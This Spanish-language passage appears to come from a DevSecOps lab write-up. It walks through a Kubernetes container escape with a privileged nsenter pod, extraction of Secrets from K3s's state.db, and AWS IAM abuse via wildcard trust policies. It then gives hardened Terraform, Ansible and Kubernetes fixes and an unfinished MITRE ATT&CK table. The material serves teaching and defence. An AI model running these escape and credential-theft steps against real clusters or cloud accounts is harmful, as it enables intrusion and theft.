**Dos vías de acceso a esta capa, no una.** El `kubeconfig` con privilegios de `cluster-admin` es legible directamente desde el host una vez obtenido el acceso root de la subsección 2 (`/etc/rancher/k3s/k3s.yaml`). Alternativamente, si el pivote hubiera venido primero por el CI/CD (subsección 3), el propio Act-Runner suele tener credenciales de despliegue con permisos equivalentes inyectadas como secreto — documentar ambas rutas es relevante porque en un entorno real no siempre se dispone de las dos, y conviene saber qué privilegios exactos otorga cada una.

**Qué significa `cluster-admin` en la práctica.** No es solo "privilegios altos": es acceso de lectura y escritura a todos los namespaces del clúster, capacidad de crear cualquier tipo de recurso (incluyendo pods con `privileged: true` y `hostPath` arbitrario) y de leer cualquier `Secret` almacenado, sin restricción de RBAC.

**Despliegue del pod malicioso:**

```yaml
# malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned-node
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: hacker-container
    image: alpine:latest
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n sh"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
```

```bash
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
kubectl apply -f malicious-pod.yaml
```
=================================================================
NODO HOST (Linux Kernel / devsecops-control-node)

[ Sistema de Archivos del Host (/) ] <----+
| (hostPath: / → /host)
+-----------------------------------------|-------------------+
| POD MALICIOSO (pwned-node) | |
| - privileged: true --------------------+ |
| - hostNetwork: true (comparte red del host) |
| - hostPID: true (ve los procesos del host) |
| Comando: nsenter -t 1 -m -u -i -n sh |
+-----------------------------+-------------------------------+
│
▼
[ SALTA AL ESPACIO DE NOMBRES PID 1 ]
│
▼
ACCESO ROOT INTERACTIVO AL HOST


`nsenter -t 1 -m -u -i -n sh` entra al espacio de nombres de montaje, UTS, IPC y red del proceso con PID 1 del host (el propio `init`) — a efectos prácticos, es indistinguible de tener una sesión root nativa en el nodo.

**El hallazgo de `state.db` (Kine).** K3s, por defecto, no usa `etcd` como backend de estado — usa **Kine**, que traduce las llamadas de la API de Kubernetes a una base de datos SQL simple, en este caso SQLite, almacenada en disco:

```bash
sqlite3 /var/lib/rancher/k3s/server/db/state.db \
  "SELECT name, value FROM kine WHERE name LIKE '%secrets%';"
```

El valor de cada `Secret` de Kubernetes está ahí, **codificado en base64 pero sin cifrado en reposo** (a menos que se haya habilitado explícitamente `--secrets-encryption` en K3s):

```bash
echo "<valor_extraido>" | base64 -d
```

Esto expone potencialmente cualquier credencial que el clúster gestione como `Secret` — incluidas las credenciales de cloud usadas por el CI/CD para desplegar el IaC.

**El insight de esta capa:** Kubernetes añade capas de abstracción, pero no añade aislamiento por defecto. Un pod con `privileged: true` + `hostPath: /` es funcionalmente equivalente a tener acceso root al nodo — la orquestación de contenedores da una falsa sensación de aislamiento que muchos equipos nunca cuestionan hasta que alguien la explota.

#### Ficha de Riesgo — Kubernetes

| Táctica (MITRE ATT&CK) | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Escape to Host | T1611 | PodSecurity Admission en modo `restricted`; prohibir `hostPID`/`hostNetwork`/`hostPath` |
| Credential Access | Unsecured Credentials: Cloud Instance Metadata / Kine DB | T1552.005 | Habilitar `--secrets-encryption` en K3s; migrar a `etcd` cifrado en reposo |
| Discovery | Cloud Service Discovery / Permission Groups Discovery: K8s | T1069.003 | RBAC de mínimo privilegio; auditoría de bindings a `cluster-admin` |
| Impact | Data Encrypted for Impact / Data Destruction (potencial) | T1486 / T1485 | Backups inmutables del `state.db`; alertas sobre pods con `privileged: true` |

> **Con `cluster-admin` y los secretos de Kine en mano, el objetivo final es usar las credenciales de cloud obtenidas para tomar control directo del origen de todo: la infraestructura como código.**

</details>

### `[✓] DVWA → [✓] MySQL → [✓] Host → [✓] CI/CD → [✓] K8s → [→] IaC`

<details>
<summary><strong>5 · IaC / Cloud — Objetivo Final</strong></summary>

Credenciales AWS (extraídas de Secrets de K8s / entorno del runner)
│
▼
aws sts get-caller-identity ──▶ identidad confirmada: dev-user-admin / rol asumible
│
├──▶ AdministratorAccess adjunto directamente al usuario IAM
├──▶ iam:PassRole sin restricción de Resource
└──▶ AssumeRole con Principal: "*" en la trust policy del rol
│
▼
Control administrativo total sobre AWS/LocalStack
(S3 público, EC2, y capacidad de modificar el propio Terraform state)


**Acceso con las credenciales obtenidas.** Con las credenciales de cloud extraídas en la capa anterior (vía Kine o vía secretos del runner):

```bash
export AWS_ACCESS_KEY_ID=<extraído>
export AWS_SECRET_ACCESS_KEY=<extraído>
aws sts get-caller-identity --endpoint-url=http://192.168.252.10:4566
```

Confirmación de los tres hallazgos ya identificados en la fase de Arquitectura (punto 2), ahora **demostrados en explotación real**, no solo leídos en el código:

```bash
# AdministratorAccess adjunto directamente
aws iam list-attached-user-policies --user-name dev-user-admin \
  --endpoint-url=http://192.168.252.10:4566
# → PolicyArn: arn:aws:iam::aws:policy/AdministratorAccess

# AssumeRole sin restricción de origen
aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/devsecops-unrestricted-role \
  --role-session-name pwn \
  --endpoint-url=http://192.168.252.10:4566
# → Éxito: la trust policy tiene Principal: "*"

# Bucket S3 leído/escrito sin ninguna credencial
curl http://devsecops-public-data-bucket.s3.amazonaws.com/
aws s3 cp ./payload.txt s3://devsecops-public-data-bucket/ --no-sign-request
```

**Por qué `iam:PassRole` sin restricción es crítico, no solo "más de lo mismo".** No es únicamente "tener permisos altos" — es la capacidad de **asignar cualquier rol de la cuenta a cualquier servicio** (una instancia EC2, una función Lambda, un pipeline). Esto equivale a una escalada de privilegios permanente y, a diferencia de un `AdministratorAccess` directo y visible, es mucho más difícil de detectar en una auditoría superficial: el usuario en sí puede parecer de bajo privilegio, pero puede *convertirse* en cualquier rol de la cuenta bajo demanda.

**El origen del problema y el cierre de la cadena.** Cada una de las configuraciones que hicieron posible esta cadena completa —el Security Group abierto, el `docker.sock` en `0777`, los pods `privileged`— fueron desplegadas desde aquí, de forma automatizada y reproducible, vía Terraform y Ansible. El IaC no es solo el objetivo final del ataque: es también el origen de todas las condiciones que lo permitieron.

**Contraste vulnerable vs. hardened.** El repositorio mantiene ambas versiones en paralelo. Esto es lo que demuestra capacidad de *remediar*, no solo de atacar:

| Fichero | Versión vulnerable | Versión hardened | Qué cierra exactamente |
|---|---|---|---|
| `iam.tf` | `Principal = "*"` en trust policy | `Principal` restringido a ARNs de cuenta/servicio concretos | Elimina el `AssumeRole` no autenticado |
| `iam.tf` | `iam:PassRole` con `Resource = "*"` | `Resource` acotado a roles específicos por ARN | Elimina la escalada de privilegios vía PassRole |
| `iam.tf` | `AdministratorAccess` adjunto al usuario | Políticas de mínimo privilegio, scoped por servicio | Elimina el compromiso total desde una sola credencial de usuario |
| `network.tf` | SSH y API Docker (2375) abiertos a `0.0.0.0/0` | Rangos CIDR restringidos a IPs de administración conocidas | Elimina la exposición directa a internet de puertos administrativos |
| `s3.tf` | `block_public_acls = false` + policy pública | Bloqueo de acceso público activo, sin policy pública | Elimina la exfiltración/manipulación anónima de datos |

**Insight de cierre de toda la cadena de explotación:** el ataque comenzó con una inyección de fichero en una aplicación web pública y terminó con control administrativo total sobre la infraestructura cloud. **Ningún paso individual fue un exploit de día cero.** Cada uno aprovechó una decisión de configuración que, tomada de forma aislada, podía parecer razonable en su contexto (una comodidad de desarrollo, un valor por defecto, una prisa por hacer funcionar algo) pero que resultó inapropiada en un entorno con conectividad real entre capas. Esto es exactamente lo que una auditoría de seguridad seria busca encontrar — antes de que lo encuentre un atacante.

#### Ficha de Riesgo — IaC / Cloud

| Táctica (MITRE ATT&CK) | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 | Políticas IAM de mínimo privilegio; revisión periódica de `AdministratorAccess` adjuntos |
| Privilege Escalation | Abuse Elevation Control Mechanism: PassRole (IAM) | T1548 | Restringir `Resource` en toda policy que incluya `iam:PassRole` |
| Initial Access | Trusted Relationship / Valid Accounts | T1199 / T1078 | `Principal` explícito en toda trust policy, nunca `"*"` |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | Bloqueo de acceso público a nivel de cuenta (`S3 Block Public Access`) |

</details>

</details>

## Remediación y Hardening

> **Nota de diseño:** esta sección no es un checklist de "cosas a cambiar". Es la demostración de que se entiende **por qué** funcionó cada ataque — y que eso implica reimplementar el control de seguridad que faltaba, no solo editar una línea. Remediar sin entender la causa raíz es parchear; lo que sigue es arreglar.
>
> Para cada vulnerabilidad explotada en la sección anterior se documenta: el diff real entre la versión vulnerable y la hardened, el control de seguridad que restaura, y el control sistémico que evita que ese tipo de error vuelva a aparecer en el siguiente despliegue.

### Resumen ejecutivo de remediaciones

| Capa | Vulnerabilidad explotada | Control roto | Fix aplicado | Severidad pre | Severidad post | Control sistémico |
|---|---|---|---|---|---|---|
| IaC / IAM | `Principal = "*"` en trust policy | Identidad / confianza | `Principal` restringido a ARN de cuenta | 🔴 Crítica | 🟢 Cerrado | `tfsec` / `checkov` en pipeline |
| IaC / IAM | `iam:PassRole` con `Resource = "*"` | Identidad / escalada | `Resource` acotado a ARNs específicos | 🔴 Crítica | 🟢 Cerrado | SCPs en AWS Organizations |
| IaC / IAM | `AdministratorAccess` adjunto al usuario | Identidad / privilegio | Política de mínimo privilegio por servicio | 🔴 Crítica | 🟢 Cerrado | AWS IAM Access Analyzer |
| IaC / Red | SG con SSH + Docker API abiertos a `0.0.0.0/0` | Acceso a red | CIDR restringido; puerto 2375 eliminado | 🟠 Alta | 🟢 Cerrado | `tfsec` rule `aws-ec2-no-public-ingress-sgr` |
| IaC / S3 | Bucket público con `PutObject`/`GetObject` para `"*"` | Exposición de datos | Bloqueo de acceso público + policy eliminada | 🔴 Crítica | 🟢 Cerrado | S3 Block Public Access a nivel de cuenta |
| Provisioning | UFW deshabilitado vía Ansible | Aislamiento de red | UFW habilitado, reglas de ingress explícitas | 🟠 Alta | 🟢 Cerrado | `ansible-lint` + testeo con `inspec` |
| Provisioning | `docker.sock` con permisos `0777` | Aislamiento de proceso | Permisos `0660`, grupo `docker` restringido | 🔴 Crítica | 🟢 Cerrado | Docker rootless mode |
| K8s | Pods con `privileged: true` + `hostPath: /` | Aislamiento de contenedor | `privileged: false`, sin `hostPath`, `readOnlyRootFilesystem` | 🔴 Crítica | 🟢 Cerrado | Pod Security Admission (`restricted`) |
| K8s | `state.db` (Kine) sin cifrado en reposo | Exposición de datos | `--secrets-encryption` en K3s | 🟠 Alta | 🟠 Reducida | Migración a `etcd` con cifrado nativo |
| CI/CD | Secretos hardcodeados en ConfigMap | Gestión de secretos | Externalizar a gestor de secretos + OIDC | 🔴 Crítica | 🟢 Cerrado | Gitleaks en pre-commit + OIDC federation |
| CI/CD | Runner con `privileged: true` + `docker.sock` | Aislamiento de proceso | Runner sin `privileged`, sin socket del host | 🔴 Crítica | 🟢 Cerrado | Runners efímeros + Kaniko/Buildah |
| App (DVWA) | Secretos en `config.inc.php` en texto plano | Gestión de secretos | Secrets de K8s + montaje como variable de entorno | 🟠 Alta | 🟢 Cerrado | External Secrets Operator / Vault |

---

<details>
<summary><strong>01 · IaC / Cloud — Terraform (hardened)</strong></summary>

#### `iam.tf`

```diff
- # Trust policy que permite asumir el rol a cualquier origen (*)
- Principal = "*"
+ # Trust policy restringida al ARN de la cuenta y servicio concreto
+ Principal = {
+   AWS = "arn:aws:iam::${var.account_id}:root"
+ }
```

```diff
- # iam:PassRole sin restricción de Resource
- Action   = "iam:PassRole"
- Resource = "*"
+ # iam:PassRole acotado a los roles que legítimamente necesita pasar
+ Action   = "iam:PassRole"
+ Resource = [
+   "arn:aws:iam::${var.account_id}:role/devsecops-ec2-role",
+   "arn:aws:iam::${var.account_id}:role/devsecops-lambda-role"
+ ]
```

```diff
- # AdministratorAccess adjunto directamente al usuario IAM
- policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+ # Política de mínimo privilegio: solo los permisos que el servicio realmente usa
+ policy_arn = aws_iam_policy.minimal_privilege_policy.arn
```

Versión hardened completa:

```hcl
# iam.tf — hardened
resource "aws_iam_role" "restricted_role" {
  name = "devsecops-restricted-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action    = "sts:AssumeRole"
      Effect    = "Allow"
      Principal = {
        AWS = "arn:aws:iam::${var.account_id}:root"
      }
      Condition = {
        StringEquals = {
          "sts:ExternalId" = var.external_id
        }
      }
    }]
  })
}

resource "aws_iam_policy" "passrole_restricted" {
  name = "PassRoleRestrictedPolicy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = "iam:PassRole"
      Resource = [
        "arn:aws:iam::${var.account_id}:role/devsecops-ec2-role"
      ]
    }]
  })
}

resource "aws_iam_policy" "minimal_privilege_policy" {
  name = "DevsecopsMinimalPolicy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Action = [
        "s3:GetObject",
        "ec2:DescribeInstances"
      ]
      Resource = "*"
    }]
  })
}

resource "aws_iam_user_policy_attachment" "user_minimal_attach" {
  user       = aws_iam_user.service_user.name
  policy_arn = aws_iam_policy.minimal_privilege_policy.arn
}
```

**Control restaurado:** principio de mínimo privilegio (Least Privilege) en las tres dimensiones críticas de IAM — quién puede asumir el rol (`Principal` explícito + `ExternalId`), qué roles puede delegar (`PassRole` con `Resource` concreto) y qué puede hacer directamente el usuario (política scoped por acción y recurso).

**Control sistémico:** `tfsec` y `checkov` en el pipeline de CI/CD detectan `Principal: "*"`, `Resource: "*"` en `PassRole` y adjuntos de `AdministratorAccess` como errores bloqueantes antes de que lleguen a `terraform apply`. AWS IAM Access Analyzer detecta roles públicamente asumibles en la cuenta como hallazgo automático.

---

#### `network.tf`

```diff
- # SSH abierto al mundo
- ingress { from_port = 22, cidr_blocks = ["0.0.0.0/0"] }
+ # SSH restringido a la IP del bastión / red de administración
+ ingress { from_port = 22, cidr_blocks = [var.admin_cidr] }

- # Docker API sin cifrar, expuesta al mundo
- ingress { from_port = 2375, cidr_blocks = ["0.0.0.0/0"] }
+ # Puerto 2375 eliminado — Docker API no debe exponerse a red; usar SSH tunneling o TLS (2376)
  # (regla eliminada)

- # Egress sin restricción
- egress { protocol = "-1", cidr_blocks = ["0.0.0.0/0"] }
+ # Egress restringido a destinos conocidos (actualizaciones, repositorios)
+ egress { from_port = 443, protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
+ egress { from_port = 80,  protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
```

Versión hardened completa:

```hcl
# network.tf — hardened
resource "aws_security_group" "hardened_sg" {
  name        = "restricted-management-sg"
  description = "Security Group con acceso administrativo restringido"
  vpc_id      = aws_vpc.hardened_vpc.id

  ingress {
    description = "SSH desde red de administración únicamente"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.admin_cidr]  # ej. "10.10.0.0/24"
  }

  egress {
    description = "HTTPS hacia internet (actualizaciones, repositorios)"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    description = "HTTP hacia internet (repositorios de paquetes)"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

**Control restaurado:** control de acceso a red — principio de denegación por defecto con apertura explícita y scoped de ingress y egress.

**Control sistémico:** regla `aws-ec2-no-public-ingress-sgr` de `tfsec`; SCPs en AWS Organizations que prohíban `0.0.0.0/0` en puertos administrativos (22, 2375, 3389) a nivel organizativo.

---

#### `s3.tf`

```diff
- block_public_acls       = false
- block_public_policy     = false
- ignore_public_acls      = false
- restrict_public_buckets = false
+ block_public_acls       = true
+ block_public_policy     = true
+ ignore_public_acls      = true
+ restrict_public_buckets = true

- # Bucket policy con Principal: "*" y acceso de escritura y lectura públicos
- Principal = "*"
- Action = ["s3:GetObject", "s3:PutObject", "s3:ListBucket"]
+ # Bucket policy eliminada — acceso solo a través de roles IAM explícitos
+ # (recurso aws_s3_bucket_policy eliminado)
```

Versión hardened completa:

```hcl
# s3.tf — hardened
resource "aws_s3_bucket" "private_bucket" {
  bucket        = "devsecops-private-data-bucket"
  force_destroy = false  # Protección contra borrado accidental

  tags = { Environment = "Hardened" }
}

resource "aws_s3_bucket_public_access_block" "block_all_public" {
  bucket                  = aws_s3_bucket.private_bucket.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_versioning" "versioning" {
  bucket = aws_s3_bucket.private_bucket.id
  versioning_configuration { status = "Enabled" }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
  bucket = aws_s3_bucket.private_bucket.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}
```

**Control restaurado:** control de exposición de datos — denegación de acceso público a nivel de bucket (cuatro flags) más cifrado en reposo con KMS y versionado habilitado para trazabilidad de cambios.

**Control sistémico:** activar **S3 Block Public Access a nivel de cuenta** (una sola llamada a la API que invalida cualquier policy pública en todos los buckets de la cuenta, independientemente de lo que diga el Terraform de cada bucket). Es el control sistémico de mayor impacto/esfuerzo en esta capa.

</details>

---

<details>
<summary><strong>02 · Provisioning — Ansible (hardened)</strong></summary>

```diff
# site_vulnerable.yml → site_hardened.yml

- - name: VULNERABILIDAD - Desactivar Firewall del sistema (UFW)
-   ufw:
-     state: disabled
+ - name: HARDENING - Habilitar UFW con política por defecto de denegación
+   ufw:
+     state: enabled
+     policy: deny
+
+ - name: HARDENING - Permitir SSH solo desde red de administración
+   ufw:
+     rule: allow
+     port: 22
+     proto: tcp
+     src: "{{ admin_network_cidr }}"

- - name: VULNERABILIDAD - Socket de Docker expuesto a todos los usuarios (0777)
-   file:
-     path: /var/run/docker.sock
-     mode: '0777'
+ - name: HARDENING - Socket de Docker con permisos restringidos al grupo docker
+   file:
+     path: /var/run/docker.sock
+     owner: root
+     group: docker
+     mode: '0660'
+
+ - name: HARDENING - Asegurar que solo usuarios explícitamente añadidos pertenecen al grupo docker
+   command: grep ^docker /etc/group
+   register: docker_group_members
+   changed_when: false
```

Versión hardened completa (`site_hardened.yml`):

```yaml
---
- name: Configuración Segura del Sistema Operativo (Hardened)
  hosts: target_hosts
  become: yes
  tasks:

    - name: HARDENING - Habilitar UFW con política por defecto de denegación
      ufw:
        state: enabled
        policy: deny

    - name: HARDENING - Permitir SSH solo desde red de administración
      ufw:
        rule: allow
        port: 22
        proto: tcp
        src: "{{ admin_network_cidr }}"

    - name: HARDENING - Socket de Docker con permisos restringidos (0660, grupo docker)
      file:
        path: /var/run/docker.sock
        owner: root
        group: docker
        mode: '0660'

    - name: HARDENING - Verificar membresía del grupo docker (auditoría)
      command: getent group docker
      register: docker_group_output
      changed_when: false

    - name: HARDENING - Deshabilitar acceso a Docker API sin cifrar (puerto 2375)
      lineinfile:
        path: /etc/docker/daemon.json
        line: '{"hosts": ["unix:///var/run/docker.sock"]}'
        create: yes
      notify: restart docker

    - name: HARDENING - Habilitar logging de auditoría para el socket de Docker
      lineinfile:
        path: /etc/audit/rules.d/docker.rules
        line: "-w /var/run/docker.sock -p rwxa -k docker_socket"
        create: yes

  handlers:
    - name: restart docker
      service:
        name: docker
        state: restarted
```

**Control restaurado:** aislamiento de proceso — el socket de Docker solo es accesible por `root` y miembros explícitos del grupo `docker`; el firewall del sistema establece una política de denegación por defecto con apertura selectiva únicamente de SSH desde redes de administración conocidas.

**Control sistémico:** `ansible-lint` detecta tareas con `mode: '0777'` o `ufw: state: disabled` como errores de lint en el pipeline antes de que el playbook llegue a ejecutarse. Para validación post-despliegue: `inspec` o `auditd` con reglas sobre el socket de Docker.

</details>

---

<details>
<summary><strong>03 · Kubernetes (hardened)</strong></summary>

#### Pod de MySQL — eliminar `privileged` y `docker.sock`

```diff
# mysql-vulnerable.yaml → mysql-hardened.yaml

  securityContext:
-   capabilities:
-     add: [SYS_ADMIN]
-   privileged: true
+   allowPrivilegeEscalation: false
+   runAsNonRoot: true
+   runAsUser: 999
+   readOnlyRootFilesystem: true
+   capabilities:
+     drop: ["ALL"]

  volumeMounts:
- - mountPath: /var/run/docker.sock
-   name: docker-sock
+ # docker.sock eliminado — MySQL no tiene ninguna razón legítima para acceder al daemon de Docker

  volumes:
- - name: docker-sock
-   hostPath:
-     path: /var/run/docker.sock
-     type: Socket
+ # Volumen eliminado
```

#### Act-Runner — eliminar `privileged` y socket del host

```diff
# act-runner.yaml

  containers:
  - name: runner
    securityContext:
-     privileged: true
+     privileged: false
+     allowPrivilegeEscalation: false
+     runAsNonRoot: true
+     readOnlyRootFilesystem: true
+     capabilities:
+       drop: ["ALL"]

    volumeMounts:
-   - name: docker-socket
-     mountPath: /var/run/docker.sock
+   # docker.sock eliminado — builds vía Kaniko o Buildah sin acceso al daemon del host

  volumes:
- - name: docker-socket
-   hostPath:
-     path: /var/run/docker.sock
+ # Volumen eliminado
```

#### Pod Security Admission — política `restricted` a nivel de namespace

```yaml
# namespace-policy.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: gitea
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

Con esta etiqueta en el namespace, cualquier pod que intente arrancar con `privileged: true`, `hostPath`, `hostPID` o `hostNetwork` es rechazado por el API server antes de ser planificado — sin necesidad de webhook externo.

#### Cifrado de secrets en reposo (K3s)

```bash
# Habilitar secrets-encryption en K3s al momento del despliegue:
curl -sfL https://get.k3s.io | sh -s - \
  --secrets-encryption \
  --write-kubeconfig-mode 600

# Verificar que el cifrado está activo:
k3s secrets-encrypt status
# → Current Encryption Hash: <hash>
# → Encryption: enabled
```

Con `--secrets-encryption` activo, los valores en `state.db` (Kine/SQLite) se almacenan cifrados con AES-CBC 256-bit usando una clave local. El acceso directo al fichero `.db` no revela los valores de los Secrets.

**Control restaurado:** aislamiento de contenedor — ningún pod tiene acceso al daemon del host, a su sistema de ficheros o a sus namespaces de proceso. Los Secrets del clúster no son legibles desde el disco sin la clave de cifrado.

**Control sistémico:** Pod Security Admission en modo `restricted` como política del namespace (enforcement nativo de Kubernetes, sin dependencia de webhooks adicionales). Para control de imagen: `OPA Gatekeeper` o `Kyverno` con políticas que rechacen imágenes no firmadas o con configuraciones de seguridad ausentes. Para builds de contenedores sin `docker.sock`: sustituir el runner por uno que use **Kaniko** o **Buildah** (builds sin acceso al daemon de Docker del host).

</details>

---

<details>
<summary><strong>04 · CI/CD — Gitea / Act-Runner (hardened)</strong></summary>

#### Secretos de Gitea fuera del ConfigMap

```diff
# gitea-deployment.yaml

- kind: ConfigMap
- data:
-   app.ini: |
-     [security]
-     SECRET_KEY = secretkeylabdevsecops
-     INTERNAL_TOKEN = eyJhbGci...
-     JWT_SECRET = eyJhbGci...
+ kind: Secret  # O referencia a External Secrets Operator / Vault
+ data:
+   SECRET_KEY: <base64 de valor generado aleatoriamente>
+   INTERNAL_TOKEN: <base64 de valor generado aleatoriamente>
+   JWT_SECRET: <base64 de valor generado aleatoriamente>
```

```yaml
# gitea-deployment.yaml — montaje hardened
containers:
- name: gitea
  env:
  - name: GITEA_SECURITY_SECRET_KEY
    valueFrom:
      secretKeyRef:
        name: gitea-secrets
        key: SECRET_KEY
  - name: GITEA_SECURITY_INTERNAL_TOKEN
    valueFrom:
      secretKeyRef:
        name: gitea-secrets
        key: INTERNAL_TOKEN
```

#### Token del runner eliminado del manifiesto

```diff
# act-runner.yaml

  command:
  - sh
  - -c
  - |
    act_runner register --config /etc/act_runner/config.yaml \
      --instance http://192.168.252.10:30000 \
-     --token y2HtdzweXvxJ4g11FGxcByl8A2DjH1UiU6tpXYGl \
+     --token $(cat /run/secrets/runner-token) \
      --name k3s-devsecops-runner --no-interactive
```

#### Estado del arte: OIDC Federation — eliminar credenciales estáticas del runner

El problema de fondo con los secretos de CI/CD no es que estén hardcodeados: es que existen como artefactos estáticos que pueden ser robados. La solución de 2024-2025 es eliminarlos completamente con **OIDC federation**:

```yaml
# Ejemplo de workflow con OIDC para Gitea Actions → AWS (sin credenciales estáticas)
- name: Configure AWS credentials via OIDC
  uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/Gitea-OIDC-Role
    aws-region: us-east-1
    # No hay AWS_ACCESS_KEY_ID ni AWS_SECRET_ACCESS_KEY
    # El runner solicita credenciales temporales al STS de AWS presentando
    # un JWT firmado por Gitea como prueba de identidad
```

En el lado de AWS/Terraform:

```hcl
# iam.tf — OIDC provider para Gitea
resource "aws_iam_openid_connect_provider" "gitea" {
  url             = "https://${var.gitea_host}"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = [var.gitea_tls_thumbprint]
}

resource "aws_iam_role" "gitea_oidc_role" {
  name = "Gitea-OIDC-Role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = {
        Federated = aws_iam_openid_connect_provider.gitea.arn
      }
      Action = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringEquals = {
          "${var.gitea_host}:sub" = "repo:${var.gitea_org}/${var.gitea_repo}:ref:refs/heads/main"
        }
      }
    }]
  })
}
```

Con OIDC: no hay `AWS_ACCESS_KEY_ID` ni `AWS_SECRET_ACCESS_KEY` en ningún ConfigMap, Secret de K8s, variable de entorno del runner ni fichero de configuración. El token de acceso es temporal (15 minutos por defecto), generado en tiempo de ejecución para ese repo y rama concretos, y no puede ser reutilizado fuera de ese contexto. **Un atacante que comprometa el runner obtiene credenciales que expiran en minutos, no claves estáticas que duran indefinidamente.**

**Control restaurado:** gestión de secretos — separación entre configuración (ConfigMap) y credenciales (Secret o OIDC), con credenciales efímeras y scoped al contexto de ejecución.

**Control sistémico:** `Gitleaks` en pre-commit y en el pipeline detecta secretos en código antes de que lleguen al repositorio. `tfsec` detecta `Principal = "*"` en los roles OIDC. Runners efímeros (un pod por job, destruido al terminar) eliminan el riesgo de persistencia entre ejecuciones.

</details>

---

### Reflexión de cierre: la diferencia entre parchear y arreglar

Cada uno de los fixes anteriores resuelve el síntoma específico que fue explotado. Pero el proceso que generó esos síntomas — desarrollo sin revisión de seguridad, IaC desplegado sin pipeline de validación, runners configurados por comodidad sin considerar el radio de impacto — seguirá generando los mismos errores en el siguiente sprint si no se interviene en él.

La arquitectura de control sistémico que cierra ese ciclo tiene tres capas:

┌─────────────────────────────────────────────────────────────────┐
│ PREVENCIÓN (shift-left) │
│ tfsec / checkov en PR · Gitleaks en pre-commit │
│ ansible-lint · Kyverno / OPA en admission controller │
├─────────────────────────────────────────────────────────────────┤
│ DETECCIÓN (runtime) │
│ IAM Access Analyzer · AWS Config Rules · Falco │
│ auditd en el host · Pod Security Admission en enforce mode │
├─────────────────────────────────────────────────────────────────┤
│ RESPUESTA (post-incidente) │
│ Terraform state cifrado · S3 versioning · K3s audit log │
│ Rotación automática de credenciales · OIDC federation │
└─────────────────────────────────────────────────────────────────┘


La misma propiedad del IaC que hizo peligrosa la cadena de ataque —que los errores se despliegan de forma automatizada y reproducible en todos los entornos— es la que hace eficiente el hardening: un fix en `iam.tf` es un fix en todos los entornos a la vez, con trazabilidad completa en el historial de Git. La doble cara del IaC: la que conviene mostrar a quien evalúa este proyecto.


---

## Matriz MITRE ATT&CK — Cobertura Completa de la Kill Chain

> Esta tabla consolida todas las técnicas materializadas en la cadena de ataque del laboratorio. Cada fila conecta el ID de técnica con el artefacto concreto que la ejecutó, el vector de detección en un entorno real, y la mitigación formal de MITRE que la cierra. No es un mapeo genérico — es la firma técnica de este laboratorio específico.

### Agrupado por táctica

#### Initial Access

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Exploit Public-Facing Application | T1190 | DVWA File Upload + LFI → reverse shell como `www-data` | WAF alert: extensión `.php` subida a directorio de uploads; spike en requests POST a `/upload/` | M1048 · M1050 |
| Valid Accounts: Cloud Accounts | T1078.004 | Credenciales IAM de `dev-user-admin` con `AdministratorAccess`, extraídas de `state.db` / entorno del runner | CloudTrail: `AssumeRole` desde IP/región inusual; `GetCallerIdentity` sin user-agent de AWS CLI legítimo | M1036 · M1026 |

#### Execution

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Command and Scripting Interpreter: PHP | T1059.004 | `sys_eval()` vía UDF MySQL ejecutando Python reverse shell; PHP `fsockopen` como scanner de red interno | Syslogs del proceso MySQL lanzando conexiones salientes; EDR: `mysql` proceso hijo de `python` | M1038 · M1045 |
| Exploitation for Client Execution (UDF Abuse) | T1203 | Carga de `lib_mysqludf_sys_64.so` vía `DUMPFILE` + `CREATE FUNCTION sys_eval` | MySQL general query log: `CREATE FUNCTION` + `INTO DUMPFILE` en `plugin_dir` | M1038 · M1051 |
| Container Administration Command | T1609 | Docker Engine API sobre Unix socket (`/var/run/docker.sock`) sin CLI, usando Python raw socket | Auditd: `connect` sobre `docker.sock` desde proceso `python` dentro del pod de MySQL | M1047 |
| User Execution: Malicious File | T1204.002 | Ejecución del payload base64-obfuscado en el workflow `.gitea/workflows/01-sast-sca.yaml` | SIEM: proceso `bash` con argumento `base64 -d | sh` lanzado desde el proceso del runner | M1038 · M1045 |

#### Persistence

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
